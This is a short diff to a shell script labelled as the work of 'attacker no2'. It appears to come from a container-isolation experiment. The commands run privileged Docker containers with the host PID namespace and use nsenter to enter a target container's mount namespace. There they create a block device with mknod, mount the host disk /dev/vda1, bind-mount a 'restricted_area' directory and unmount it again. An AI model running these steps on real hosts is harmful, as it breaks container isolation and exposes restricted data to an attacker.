@@ -16,11 +16,15 @@ END
 
 #Done by attacker no2
 #: <<'END'
-docker run --privileged --rm -it --security-opt "apparmor=attacker2_profile" --cap-add SYS_ADMIN --cap-add SYS_CHROOT --cap-add SYS_PTRACE --pid=host debian:latest nsenter --target ${container_pid} --mount mount /dev/vda1 /tmpmount
+docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} mknod --mode 0600 /dev/vda1 b 253 1
+
+docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} mkdir -p /tmpmount
+docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mount /dev/vda1 /tmpmount
 
 #I can do mkdir and mknod with nsenter too -> version 4
 
-docker run --privileged --rm -it --security-opt "apparmor=attacker2_profile" --cap-add SYS_ADMIN --cap-add SYS_PTRACE --cap-add SYS_CHROOT --pid=host debian:latest nsenter --target ${container_pid} --mount mount -o bind /tmpmount/${attack}/restricted_area /doot
 
-docker run --privileged --rm -it --security-opt "apparmor=attacker2_profile" --cap-add SYS_ADMIN --cap-add SYS_PTRACE --cap-add SYS_CHROOT --pid=host debian:latest nsenter --target ${container_pid} --mount umount /tmpmount
+docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mount -o bind /tmpmount/${attack}/restricted_area /doot
+
+docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount umount /tmpmount
 #END
